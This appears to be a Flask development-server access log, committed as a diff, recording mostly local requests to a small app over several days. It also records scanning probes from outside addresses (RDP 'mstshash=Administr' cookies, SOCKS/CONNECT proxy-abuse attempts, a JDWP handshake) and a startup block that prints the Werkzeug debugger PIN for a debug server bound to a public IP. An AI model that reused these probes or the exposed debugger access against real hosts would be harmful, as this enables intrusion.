+127.0.0.1 - - [10/Sep/2024 15:15:30] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 16:00:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:14:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:14:54] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:14:54] "GET /security_check/123/1 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:14:57] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:14:57] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:16:07] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:16:07] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:16:08] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 16:16:08] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 17:39:12] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 17:39:13] "GET / HTTP/1.1" 200 -
+79.124.49.214 - - [10/Sep/2024 18:20:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [10/Sep/2024 18:20:31] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [10/Sep/2024 18:50:05] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 18:50:06] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 19:23:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 19:23:52] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 19:23:52] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 19:23:54] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 19:23:54] "GET /security_check/123/123 HTTP/1.1" 200 -
+205.210.31.171 - - [10/Sep/2024 20:26:50] "GET / HTTP/1.1" 200 -
+69.234.213.116 - - [10/Sep/2024 21:34:17] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
+69.234.213.116 - - [10/Sep/2024 21:34:17] "~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~" HTTPStatus.BAD_REQUEST -
+205.210.31.165 - - [10/Sep/2024 22:06:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:29:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:30:51] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:30:51] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:30:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:30:55] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:31:01] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:31:01] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:33:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:33:51] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:33:51] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:34:24] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:24] "GET /security_check/123/1234 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:29] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:29] "GET /security_check/123/12 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:34] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:34] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:34:41] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:34:41] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:35:32] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:35:32] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:35:39] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:35:39] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:36:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:36:54] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:36:54] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:39:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:39:25] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:39:31] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:39:31] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 23:39:37] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:39:37] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 23:39:37] "GET /security_check/123/123 HTTP/1.1" 200 -
+167.94.146.50 - - [11/Sep/2024 00:18:08] code 400, message Bad request version ('À\x14À')
+167.94.146.50 - - [11/Sep/2024 00:18:08] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x0f\x80çò\x1aÏB¾NÙ=?\x06`\x02ì¦îSÖ¢hþ2¨\x82\x9bòI\x9fÖ\x80 â&½)Ò\x81\x97ËvÕVà­n\x8b\x08P!BUn\x1a¸\x19>\x84dë5ÕCP\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.146.50 - - [11/Sep/2024 00:18:12] "GET / HTTP/1.1" 200 -
+167.94.146.50 - - [11/Sep/2024 00:18:17] "GET / HTTP/1.1" 200 -
+167.94.146.50 - - [11/Sep/2024 00:18:17] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.50 - - [11/Sep/2024 00:18:18] code 505, message Invalid HTTP version (2.0)
+167.94.146.50 - - [11/Sep/2024 00:18:18] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [11/Sep/2024 02:32:18] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 02:32:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 03:41:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 03:50:29] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 03:50:34] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 04:17:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 04:17:23] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 04:17:38] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 04:17:38] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 05:00:25] "GET / HTTP/1.1" 200 -
+161.189.134.11 - - [11/Sep/2024 05:33:29] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [11/Sep/2024 07:57:30] code 400, message Bad request version ('ô')
+167.94.138.120 - - [11/Sep/2024 07:57:30] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x1bÁ\x93Ä\x9c|y\x09L\x07\x89\\ÀÈÌÝÕv§\x86I#µ\x83Á<¨öû¢\x0bô " HTTPStatus.BAD_REQUEST -
+167.94.138.120 - - [11/Sep/2024 07:57:34] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [11/Sep/2024 07:57:37] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [11/Sep/2024 07:57:38] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.120 - - [11/Sep/2024 07:57:39] code 505, message Invalid HTTP version (2.0)
+167.94.138.120 - - [11/Sep/2024 07:57:39] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [11/Sep/2024 08:29:36] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 08:29:36] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 08:29:41] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 08:29:41] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 08:33:36] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 09:25:08] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 09:25:08] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 09:25:28] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 09:26:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 09:27:34] "GET / HTTP/1.1" 200 -
+106.39.130.70 - - [11/Sep/2024 09:28:14] "GET / HTTP/1.1" 200 -
+106.39.130.70 - - [11/Sep/2024 09:28:15] "GET /favicon.ico HTTP/1.1" 404 -
+ * Serving Flask app 'main_1'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://103.242.175.245:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 115-489-574
+127.0.0.1 - - [11/Sep/2024 18:50:08] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 18:50:08] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 18:50:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 18:50:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 18:50:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 18:50:12] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Sep/2024 18:50:12] "GET /security_check/123/123 HTTP/1.1" 200 -
+185.234.216.112 - - [11/Sep/2024 19:31:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [11/Sep/2024 19:31:36] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [11/Sep/2024 20:58:34] code 400, message Bad request syntax ('\x04\x01\x00\x19h/\x12á\x00')
+80.66.83.114 - - [11/Sep/2024 20:58:34] "\x04\x01\x00\x19h/\x12á\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [11/Sep/2024 20:59:34] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.114 - - [11/Sep/2024 20:59:34] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [11/Sep/2024 20:59:34] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 404 -
+80.66.83.114 - - [11/Sep/2024 21:07:08] code 400, message Bad request syntax ('\x04\x01\x00\x194e*\x07\x00')
+80.66.83.114 - - [11/Sep/2024 21:07:08] "\x04\x01\x00\x194e*\x07\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [11/Sep/2024 21:08:08] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.114 - - [11/Sep/2024 21:08:08] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [11/Sep/2024 21:08:08] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 21:29:35] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [11/Sep/2024 23:38:16] "GET / HTTP/1.1" 200 -
+79.124.49.214 - - [12/Sep/2024 00:00:08] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [12/Sep/2024 00:00:08] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [12/Sep/2024 00:23:11] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00PUÎ')
+80.66.83.114 - - [12/Sep/2024 00:23:11] "\x04\x01\x00PUÎ s\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [12/Sep/2024 00:24:12] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.114 - - [12/Sep/2024 00:24:12] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+80.66.83.114 - - [12/Sep/2024 00:24:12] "CONNECT 85.206.160.115:80 HTTP/1.1" 404 -
+83.222.190.78 - - [12/Sep/2024 03:38:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [12/Sep/2024 03:38:52] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [12/Sep/2024 04:21:52] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 04:21:53] "GET / HTTP/1.1" 200 -
+162.142.125.223 - - [12/Sep/2024 04:26:49] code 400, message Bad request version ('À\x14À')
+162.142.125.223 - - [12/Sep/2024 04:26:49] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x04Ç®Û\x8a»v0Ðï´ßÌ}\x1c÷XöÊ§á\x0dOû\x91\x8e¦µ 'TW îjY0\x99WtÃ¥0KòVÄ(\x9d2^:ËÃ\x081ÚäMÿ\x09×\x85×W\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+162.142.125.223 - - [12/Sep/2024 04:26:53] "GET / HTTP/1.1" 200 -
+162.142.125.223 - - [12/Sep/2024 04:26:58] "GET / HTTP/1.1" 200 -
+162.142.125.223 - - [12/Sep/2024 04:27:00] "GET /favicon.ico HTTP/1.1" 404 -
+162.142.125.223 - - [12/Sep/2024 04:27:02] code 505, message Invalid HTTP version (2.0)
+162.142.125.223 - - [12/Sep/2024 04:27:02] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+205.210.31.241 - - [12/Sep/2024 08:35:07] "GET / HTTP/1.0" 200 -
+178.159.37.98 - - [12/Sep/2024 10:40:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [12/Sep/2024 10:40:58] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [12/Sep/2024 10:48:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 10:53:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 10:53:47] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 10:54:04] "GET /idget/violet HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 10:54:04] "GET /security_check/violet/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 10:54:08] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [12/Sep/2024 11:08:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [12/Sep/2024 11:08:09] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [12/Sep/2024 11:10:32] "GET / HTTP/1.1" 200 -
+147.185.132.144 - - [12/Sep/2024 11:23:54] "GET / HTTP/1.1" 200 -
+154.213.185.206 - - [12/Sep/2024 11:25:21] code 400, message Bad request syntax ('JDWP-Handshake')
+154.213.185.206 - - [12/Sep/2024 11:25:21] "JDWP-Handshake" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [12/Sep/2024 12:23:04] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 12:23:04] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 12:23:04] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 12:23:11] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 12:23:11] "GET /security_check/123/123 HTTP/1.1" 200 -
+23.94.20.2 - - [12/Sep/2024 13:37:14] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+23.94.20.2 - - [12/Sep/2024 13:37:14] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+185.234.216.112 - - [12/Sep/2024 14:09:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [12/Sep/2024 14:09:15] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+79.124.56.186 - - [12/Sep/2024 16:35:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [12/Sep/2024 16:35:05] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+83.222.190.78 - - [12/Sep/2024 17:34:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [12/Sep/2024 17:34:18] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [12/Sep/2024 17:53:36] "GET / HTTP/1.1" 200 -
+79.124.49.214 - - [12/Sep/2024 19:18:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [12/Sep/2024 19:18:45] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [12/Sep/2024 20:05:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 20:05:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 20:05:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 20:05:29] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 20:05:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 20:05:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 20:05:36] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 20:05:43] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 20:05:43] "GET /security_check/123/123 HTTP/1.1" 200 -
+167.94.146.54 - - [12/Sep/2024 21:02:29] code 400, message Bad request version (':ø[jõ£ü\x8cfå\x0eI®1*\x19Ül\x8e`\x81ô')
+167.94.146.54 - - [12/Sep/2024 21:02:29] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ÄmFzT\x14\x03{ò\x10{\x90\\ôÛ\x85Éo\x9cxjÌúM\x89--úIÙeþ :ø[jõ£ü\x8cfå\x0eI®1*\x19Ül\x8e`\x81ô" HTTPStatus.BAD_REQUEST -
+167.94.146.54 - - [12/Sep/2024 21:02:33] "GET / HTTP/1.1" 200 -
+167.94.146.54 - - [12/Sep/2024 21:02:37] "GET / HTTP/1.1" 200 -
+167.94.146.54 - - [12/Sep/2024 21:02:37] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.54 - - [12/Sep/2024 21:02:38] code 505, message Invalid HTTP version (2.0)
+167.94.146.54 - - [12/Sep/2024 21:02:38] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [12/Sep/2024 21:29:05] "GET / HTTP/1.1" 200 -
+167.94.145.100 - - [12/Sep/2024 22:04:08] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x0b')
+167.94.145.100 - - [12/Sep/2024 22:04:08] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x0b" HTTPStatus.BAD_REQUEST -
+167.94.145.100 - - [12/Sep/2024 22:04:12] "GET / HTTP/1.1" 200 -
+167.94.145.100 - - [12/Sep/2024 22:04:16] "GET / HTTP/1.1" 200 -
+167.94.145.100 - - [12/Sep/2024 22:04:16] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.145.100 - - [12/Sep/2024 22:04:16] code 505, message Invalid HTTP version (2.0)
+167.94.145.100 - - [12/Sep/2024 22:04:16] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [12/Sep/2024 22:18:15] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 22:18:29] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 22:18:31] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 22:18:31] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Sep/2024 22:18:41] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 22:18:41] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [12/Sep/2024 23:43:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 00:27:59] "GET /ui/favicon.ico HTTP/1.1" 404 -
+83.222.190.78 - - [13/Sep/2024 02:02:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [13/Sep/2024 02:02:38] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+139.227.161.123 - - [13/Sep/2024 02:04:11] code 400, message Bad request version ('À\x13À')
+139.227.161.123 - - [13/Sep/2024 02:04:11] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x8d¬ÿ\x876\x88í\x1f£\x85Ã¼{Y\x06\x11¦\x1eÞT\x10©\x09\x03.à~j ÿòÍ \x90Tñ¬ ènt\x8eW\x93/F#\x17ôhJ¾¾4õ$Æu¦Qlmy\x8f.\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+61.158.26.87 - - [13/Sep/2024 02:04:12] "GET / HTTP/1.1" 200 -
+59.52.179.58 - - [13/Sep/2024 02:04:12] code 400, message Bad request version ('À\x13À')
+59.52.179.58 - - [13/Sep/2024 02:04:12] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Í;w\x10\x9d\x80r$Q$»\x93À6\x89:\x85JÝH,ºO\x14±ÊZ\x89)À\x7fô »\x84\x90S\x88\x1c§ÏÇ\x05wÆ]ò\x9d\x9f#¡Köõ\x1bB.\x87gÞw ä%½\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+60.13.138.62 - - [13/Sep/2024 02:04:21] code 400, message Bad request syntax ('{\x01\x00\x1613911111112À¨\x01\x01\x13\x90{')
+60.13.138.62 - - [13/Sep/2024 02:04:21] "{\x01\x00\x1613911111112À¨\x01\x01\x13\x90{" HTTPStatus.BAD_REQUEST -
+118.212.121.84 - - [13/Sep/2024 02:04:23] "GET / HTTP/1.0" 200 -
+183.160.194.98 - - [13/Sep/2024 02:04:38] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x02\x00\x00\x00\x00\x15\x00\x032~')
+183.160.194.98 - - [13/Sep/2024 02:04:38] "~\x00\x02\x00\x00\x02\x00\x00\x00\x00\x15\x00\x032~" HTTPStatus.BAD_REQUEST -
+112.94.252.102 - - [13/Sep/2024 02:04:39] code 400, message Bad request syntax ('Íc\x00\x00\x00\x05\x00+\x0e\x01\x00')
+112.94.252.102 - - [13/Sep/2024 02:04:39] "Íc\x00\x00\x00\x05\x00+\x0e\x01\x00" HTTPStatus.BAD_REQUEST -
+123.158.51.112 - - [13/Sep/2024 02:05:48] "GET / HTTP/1.1" 200 -
+101.68.51.222 - - [13/Sep/2024 02:05:49] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:07:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:08:08] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:11:08] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:11:12] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:12:54] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:12:54] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:12:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:13:09] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:14:34] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:14:35] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:15:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:15:16] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:15:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:15:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:16:05] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:16:41] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:16:48] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:16:54] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:18:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:18:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:18:02] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:18:04] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:18:34] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:18:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:18:45] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:18:49] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:18:50] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:18:56] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:19:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:19:07] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:19:56] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:19:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:19:59] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:20:01] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:20:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:20:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 02:20:50] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:20:54] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 02:21:49] "GET / HTTP/1.1" 200 -
